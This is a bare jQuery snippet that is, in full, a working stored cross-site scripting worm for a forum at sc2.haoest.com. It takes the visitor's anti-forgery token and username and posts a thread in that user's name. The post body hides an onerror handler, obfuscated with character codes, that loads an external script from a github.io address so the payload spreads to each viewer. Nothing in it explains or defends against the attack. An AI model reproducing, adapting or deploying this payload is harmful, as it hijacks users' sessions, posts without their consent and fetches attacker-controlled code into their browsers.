$.post('http://sc2.haoest.com/Forum/1/AddPost',{
  __RequestVerificationToken:$('input[name="__RequestVerificationToken"]').val(),
  ForumId:'1',
  Title:'大家好我叫'+$('.sign-in-partial li a:first').text().trim(),
  Content:'<p>支持好易思特星际战区！<img src="error.jpg" onerror="window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,106,97,103,117,97,114,115,121,46,103,105,116,104,117,98,46,105,111,47,104,97,111,101,115,116,46,106,115);document.body.appendChild(window.s)"></p>',
  Excerpt:'支持好易思特星际战区！',
  editorValue:''
},function(data){});
